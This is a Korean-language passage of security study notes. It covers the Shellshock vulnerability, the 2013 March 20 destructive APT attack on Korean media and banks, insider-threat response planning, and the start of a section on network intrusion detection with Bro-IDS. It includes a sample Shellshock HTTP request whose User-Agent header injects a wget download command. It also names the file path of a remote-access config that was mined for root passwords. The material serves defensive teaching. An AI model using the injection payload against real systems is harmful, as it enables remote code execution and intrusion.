# 보안 위협 정보 수집

## 보안 위협 이해

### 애플리케이션 취약점

2014년에 발생할 셸 쇼크(CVE-2014-6271, CVE-2014-7169) 취약점에 대해 알아보자.

2014년 9월 사용된 공격 방식은 bash 환경 변수로 저장되는 헤더 항목에 공격 구문을 삽입해 취약한 시스템을 공격하는 방식이었다.

```bash
telnet [ip] 80
GET /cgi-bin/test-cgi
...
User-Agent: (){:;}; wget -O /tmp/tmp # wget 명령을 이용해 다운로드한 파일을 tmp 디렉터리에 tmp 파일명으로 저장한다
```

대부분의 해킹 공격은 취약한 시스템을 공격하는 걸로 끝나지 않고, 자동화된 공격을 통해 취약한 시스템 접근을 확보한 후에 경유 시스템으로 많이 사용된다.

사례를 살펴보면

* 11/4: IDC 서버 이상 발견
  11/3 12:00부터 외부로 불생된 SSH 사전식 대응 공격 확인

* 11/4: 원인 분석 수행(침해사고 분석)
  BashShell 취약점 공격 확인
  악성코드 유입: http:// ... /bbs/skin/zero_vote/cpan_root

* 분석 결과 요약
  11/01: Bash shell 취약점 공격, 악성코드 설치
  11/03: 외부로 SSH 무작위 사전식 대입 공격
  11/04: 사고 인지 후 시스템 분석

많은 경우 관리 허점을 이용하며, 아직도 2006년 발표된 제로보드 취약점이 사용되고 있다.

### 지능형 지속 공격

2013년 3월 20일 국내 언론사 몇 곳의 업무 관련 시스템들이 동시 다발적으로 파괴되는 사태가 발생핬다. 이로 인해 실제로 방송이 중단되기도 했다.

* 2010년 이후 발생된 주요 사이버 공격 사례

  11/3/4 : 청와대, 금융 기관, 네이버 대상 DDoS 공격
  11/4/12 : 농협 전산망 마비
  13/3/20 : 주요 언론사 및 금융기관 전산망 동시 장애
  13/6/25 : 청와대 홈페이지 변조, 언론사 및 정부 전산센터 공격
  14/12/15 : 한국수자력발전 내부 정보 유출 공개

지능형 지속 공격은 처음 공격에서 최종 목표를 실행하기까지 최소 6개월 이상 관리자나 사용자 몰래 활동한다.

2015년 미국의 FBI 수배자 명단에 중국의 61398 부대 장교가 올라간 사건이 있었다. 이 장교들의 실명과 부대 명칭은 외국계 보안 업체를 통해 실체가 밝혀지기 시작했고 MANDIANT APT 1 보고서를 통해 APT 기법을 사용하는 해커 그룹의 특징과 실체를 구체적으로 밝혀냈다.

3/20 사태로 돌아가자. 공격 당시 공격자는 이미 확보했던 정보를 이용해 자동화된 스크립트 형태로 시스템 파괴 명령을 자동으로 실행시켰다. 방화벽 로그와 침해 시스템의 시스템 로그, 침입탐지 시스템 로그 등 사건에 연관된 모든 보안 로그를 분석했고, 일련의 추적을 통해 공격자의 타임 테이블을 구성했다.

공격 특징은 사용자 대역, 사무실 대역에 대한 악성코드 감염 / 감염된 내부 시스템을 경유해 서버 하드 디스크 파괴이다.

타임 테이블은

* 사전 준비
  웹쉘 업로드(2012/03/22, 2012/06/20) : 공격 대상 서버에 웹쉘 업로드, 파일 탈취 및 SSH 통신
  애플리케이션 공격(2012/9/4) : PHP 취약점을 이용한 원격 명령 실행
* 성공
  정보 유출(2012/10/13) : 공격 대상 서버에 웹쉘 업로드, 소스 압축 후 유출
  악성코드 배포(2012/10/18) : 공격 대상 서버에 악성코드 유포 링크 삽입
  악성코드 감염(2013/02/08) : 이미지 파일(bd.gif)를 이용해 악성코드 설치
  원격 접근(2013/03/03 00:54:21) : 데이터센터(IDC) 서버 접근
* 확산
  원격 접근 : (03/19 AM 2~4) 단일 소스 IP에서 다수 3389, AM 4~5 다수 SSH
  악성코드 감염 : (03/20 03:53:30) crw.exe 파일 동시 감염(10대 이상)
* 파괴
  2013/03/20 14시 전후 시스템 OS 부팅 영역 손상

공격자는 수년 전부터 다양한 방면으로 공격을 시도했다. 서버를 대상으로 App 취약점윌 이용해 반복적으로 웹쉘 설치 시도, 이후 내부 시스템에 대한 정보(네트워크, App, 사용자 접속 정보)를 꾸준히 수집했다.
때로 웹 서버에 악성코드를 삽입해 일반 사용자 및 내부 사용자에게 악성코드를 감염시키기도 했다.
공격받은 시스템의 복구/차단 과정을 반복적으로 관찰해 가장 효율적인(짧은 시간에 가장 많은 경로로 접근 가능한) 경로를 파악했다.
13/3월 사용자들이 많은 사무실 PC에 대해 공격을 시도해 시스템 관리자 PC가 악성코드에 감염됬고, 관리자 시스템에서 서버 접근 정보(IP, ID, PW)를 수집해 공격을 감행했다.

* 활동 내역
  * 악성코드 감염
    `Crw.exe`는 AV 프로그램에서 진단하지 못하는 타겟 맞춤형 악성코드이다.
    (MD5, SHA-1, Size(Byte)값)

    해당 악성코드는 시스템에 서비스로 등록되 자동 실행된다.
    [HKLM\SYSTEM\CurrentControlSet\Services\xmlprov Defenser]
    ImagePath=%SystemRoot%\System32/svchost.exe -k netsvcs

  * 정보 수집(원격 접속)
    특정 경로의 환경 설정 파일 정보 획득, 문자열 추출을 통해 root 패스워드 확보
    [%appdata%/Felix_Deimel/mRemote/confCons.xml]

  * 시스템 파괴
    최대 10개까지 물리 디스크(\\PHYSICALDRIVE0~9)을 열어 물리 디스크의 MBR, VBR을 PRINCPES 문자열로 반복 기록, 손상
    /kernel,/usr,/etc,/home 폴더를 차례로 rm 명령어를 이용해 삭제

다음 유형은 내부자에 의해 발생될 수 있는 기업의 내부 위협 시나리오다.

### 내부 통제

대형 통신사 대리점에서 내부 정보 조회 프로그램을 이용해 대규모 정보 유출 사건이 일어났다. 이 사건은 정상적인 조회를 가장한 정보 유출 사건으로, 뉴스를 통해 많이 보도됬다.

IT 관리 부서는 외부에서 발생하는 위협을 차단, 대응해야 하며, 내부에서 발생되는 권한 위반, 정책 위반 행위에 대해서도 모니터링하고 대응해야 한다.

* 퇴직자에 의한 내부 자료 유출, 프로젝트 수행 시 발생되는 고객 DB 정보 접근 제어 등 다양한 시나리오가 있다.
  실제 어떤 위협이 발생될지 모르는 상황에서는 위협 대응을 위해 많은 인적 자원, 시스템 자원을 사용하고 있다.

다양한 기업 IT 환경에서 좀 더 효율적인 IT 자산 운영을 위해 필요한 가이드에 대해 내부적/체계적으로 관리할 필요가 잇다.

샘플 시나리오는

* 애플리케이션 통신을 통한 문서 정보 통신

* DB 관련 파일 전송 통신

이고, 이 위협 시나리오가 일어났을 때 어떤 상황에 해당할 수 있는지 상황을 다음 표에 정의한다.

* 애플리케이션 통신을 통한 문서 정보 통신
  단순 시도인지?
  통신이 실제로 성공했는지
* DB 관련 파일 전송 통신
  단순 시도인지?
  통신이 실제로 성공했는지
  유출이 된 것인지

상황이 정의됬다면 상황에 따라 필요한 조치, 즉 액션 플랜을 구분할 수 있다.

* 애플리케이션 통신을 통한 문서 정보 통신
  단순 시도인지? : 선보고 후조치
  통신이 실제로 성공했는지 : 선조치 후보고
* DB 관련 파일 전송 통신
  단순 시도인지? : 선보고 후조치
  통신이 실제로 성공했는지 : 선조치 후보고
  유출이 된 것인지 : 선조치 후보고, 내부 상황 전파

각각 시나리오에 대한 대응 체계를 수립해 내부에서 정보 유출이 발생하거나 심각한 상황일 때 좀 더 일사 분란하게 상황을 정의하고 대응해 나갈수 있게 내부 지침을 만들 수 있다.

정의된 해당 지침 문서를 업무에 적용하려면 다음과 같은 프로세스로 도식화할 수 있다.

|관제 영역|보고|파트너|
|-------------------|
|탐지-검증-대응|대응 보고|예외 처리 절차|
|의심스러운 활동 탐지, 보안 사고 여부 판단, 위험/위협 여부 확인|(취약성 없을 시) 침해 시도 대응, (취약성 있을 시)공격 영향 범위 정의\,보고서 분류 : 위협 분석 보고서, 등급 분류: 위협 등급 정의|보안 위협, 모니터링, 반복 분석(일간/주간/월간), False Positive, False Negative, 예외 처리 승인 및 반영

기업과 조직에서는 다양한 보안 업무 목적에 따라 다양한 솔루션을 사용하고 있다. 대부분의 보안 업무가 보안 솔루션에서 발생되는 이벤트를 시작으로 이뤄진다.

업무 목적에 따라 어떤 분석 솔루션을 이용해야 할지 살펴보자.

## 침입 분석 솔루션

가트너는 2013년 보고서에서 위협 방어 스타일 5가지를 정의했다. 엔드포인트에서 네트워크까지 위협을 방어하는 방법을 정의한 것인데, 그 중 네트워크를 기반으로 한 위협 방어 방법을 살펴볼 것이다.
(5단계는 네트워크 차단 : 네트워크 트래픽 분석, 네트워크 포렌식, 페이로드 : 페이로드 분석, 엔드포인트 : 엔드포인트 행동 분석, 엔드포인트 포렌식이다)

네트워크를 통해 발생되는 위협을 분석하는 방법은 크게 3가지로 구분할 수 있다.

* 네트워크 기반의 침입탐지 시스템
  실시간으로 수집되는 네트워크 패킷 분석을 통해 시그니처 기반의 공격을 탐지한다.
* 모든 네트워크 패킷을 일정 기간 보관 후 사고가 발생할 경우 사고 발생 지점의 전체 네트워크 패킷을 분석
  네트워크 포렌식이라고 불린다.
* 네트워크 페이로드에 포함된 정보를 분석해 애플리케이션 분석 수행 (차세대 제품들의 분석 영역)
  애플리케이션 분석은 FB, 카카오톡 메신저처럼 자체 통신 프로토콜에 의한 분석이다.
* (네 번째, 다섯 번째) : 엔드포인트 기반 행위 분석, 포렌식 (법의학 관점에서 증거 채증 시 활용)

수집된 패킷을 공격 시그니처와 비교해 공격 여부를 탐지하는 동작 방식이 전통적인 네트워크 위협 탐지 기법이다. 많은 사용 네트워크 보안 제품들이 Snort 엔진을 기반으로 동작한다. 즉 잘 알려진 공격 패턴을 네트워크 패킷에서 찾아 공격 여부를 정의한다.

이는 제로데이 공격, APT 공격을 탐지하지 못하므로, 시그니처를 모르는 상태에서 대응하기 위한 해법이 필요해졌고 이런 관점에서 시작된 차세대 침입방지 시스템의 오픈소스 버전이라고 할 수 있는 Bro-IDS에 대해 알아보겠다.

### 네트워크 침입탐지 시스템

[Bro-IDS](https://www.bro.org)



## 패킷 정보 수집

